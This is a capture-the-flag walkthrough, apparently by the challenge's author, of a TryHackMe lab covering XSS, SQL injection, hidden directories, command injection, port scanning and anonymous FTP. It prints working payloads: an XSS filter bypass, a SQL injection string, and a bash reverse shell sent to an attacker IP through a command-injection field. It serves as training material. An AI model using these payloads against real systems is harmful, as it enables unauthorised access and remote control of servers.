---
title: Hackers Assemble 2: The Saga Completes
url: https://infosecwriteups.com/hackers-assemble-2-the-saga-completes-590f4813812a?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2025-09-08
fetch_date: 2025-10-02T19:48:39.415707
---

# Hackers Assemble 2: The Saga Completes

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F590f4813812a&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fhackers-assemble-2-the-saga-completes-590f4813812a&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fhackers-assemble-2-the-saga-completes-590f4813812a&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-590f4813812a---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-590f4813812a---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# Hackers Assemble 2: The Saga Completes

[![Abhishek Gupta](https://miro.medium.com/v2/resize:fill:64:64/1*GZgjZSTrP_fYenV274_csA.png)](https://medium.com/%40abhishek-ji?source=post_page---byline--590f4813812a---------------------------------------)

[Abhishek Gupta](https://medium.com/%40abhishek-ji?source=post_page---byline--590f4813812a---------------------------------------)

8 min read

·

Sep 3, 2025

--

Listen

Share

Hello, guys. This is an upgraded version of the Hackers Assemble CTF that I created. So what’s the change:

* Hackers Assemble: <https://hackers-assemble-4hd3.onrender.com/>, a comprehensive package of Web Vulnerabilities.
* But this time we have included the Host and Network Part also with a pinch of Logic and Forensics, while keeping the web part, I have reduced the difficulty of the web.
* You can check out this Room on TryHackMe: <https://tryhackme.com/jr/hackersassemble>

![]()

## WEB

Ok, so let’s start with the web.

### XSS

We have a search functionality here. It is for testing the XSS, as when I enter the classic payload <script>alert()</script>, the script and alert got sanitised, and I got this warning!

Press enter or click to view image in full size

![]()

* I tried many payloads, but it looks like script, alert, and onerror are blocked, so I tried a unique payload ***<svg onload=prompt()>***.This doesn’t have the blocked character, and it bypasses the restrictions.
* So I can execute XSS, so as per the warning, I have to fetch the flag, but let’s take a look at the hint.

Press enter or click to view image in full size

![]()

The JS code we have to use to get the flag is written here, which basically fetches the flag and then displays it.

I manually visited <http://10.10.189.188/.fl4g.php>, but it says Access Denied

Press enter or click to view image in full size

![]()

So I crafted a Payload to get the flag:

***<svg onload=”fetch(‘***[***http://10.10.189.188/.fl4g.php').then(function(response)***](http://10.10.189.188/.fl4g.php%27%29.then%28function%28response%29) ***{ return response.text(); }).then(function(flag) { document.body.innerHTML = flag; });”>***

Press enter or click to view image in full size

![]()

### SQLi

There is an Admin Panel, which is restricted, and I tried brute forcing, but that doesn’t work.

So I went to the products page, there

* When I enter a ***‘*** in the input field, I get an SQL error.

Press enter or click to view image in full size

![]()

* So I tried for SQLi on these input fields.
* I tried this payload ***‘ or 1=1 -- -*** and dumped the secret credentials, which were left there in the products table.

Press enter or click to view image in full size

![]()

* With these creds, I logged into the Admin Panel and got the flag.

![]()

### Hidden flag

So the question says, “Where am I? Hiding behind hidden paths, yeah, you may find listing some crazy things”.

So I ran dirb on the site and found out there was a directory named /assets, on which directory listing is enabled

![]()

Press enter or click to view image in full size

![]()

There is a file called Hidden. I went through it, and it has the flag.

Press enter or click to view image in full size

![]()

### Command Injection

I see a check connectivity utility, which checks if any IP is up or not, but the output looks very much similar to the ping command in Linux, so the server might be using our input in the ping command directly.

Press enter or click to view image in full size

![]()

So I tried various command separators with the whoami command, ***; && & | ||*** I tried all of them and & works for me.

Press enter or click to view image in full size

![]()

So I decided to throw a reverse shell here, and I got one.

* I ran an nc listener: ***nc -nvlp 12345***
* I entered this input with the command: ***127.0.0.1$(bash -c “bash -i >& /dev/tcp/10.17.11.227/12345 0>&1”)***

Press enter or click to view image in full size

![]()

* The flag was in the www-data’s home dir.

## Network

On running a full port scan, then a service on the open ports, I got his output.

```
nmap 10.10.189.188 -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-01 15:13 EDT
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.11% done
Stats: 0:03:49 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 28.57% done; ETC: 15:26 (0:09:33 remaining)
Nmap scan report for 10.10.189.188
Host is up (0.17s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
7777/tcp  open  cbt
10021/tcp open  unknown
25000/tcp open  icl-twobase1

Nmap done: 1 IP address (1 host up) scanned in 1363.12 seconds
```

```
nmap 10.10.189.188 -p22,80,7777,10021,25000 -sV
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-01 15:54 EDT
Stats: 0:02:40 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 80.00% done; ETC: 15:57 (0:00:40 remaining)
Nmap scan report for 10.10.189.188
Host is up (0.18s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http          Apache httpd 2.4.52
7777/tcp  open  cbt?
10021/tcp open  ftp           vsftpd 3.0.5
25000/tcp open  icl-twobase1?
1 service unrecognized despite returning data.
```

### FTP

We can see that an FTP service is running on port 10021, so I attempted to reach out.

* I tried logging in with an anonymous login, and it was allowed.
* I access ftp: ***ftp 10.10.48.70 -p 10021*** with credentials anonymous:anonymous
* But I was only able to see an image file here, but I am unable to get it as it is a large file, so my ftp gets stuck
* upon thinking a lot, I try ***ls -al*** and see a hidden file named .flag.txt

Press enter or click to view image in full size

![]()

* I get the flag onto my machine and read it.

Press enter or click to...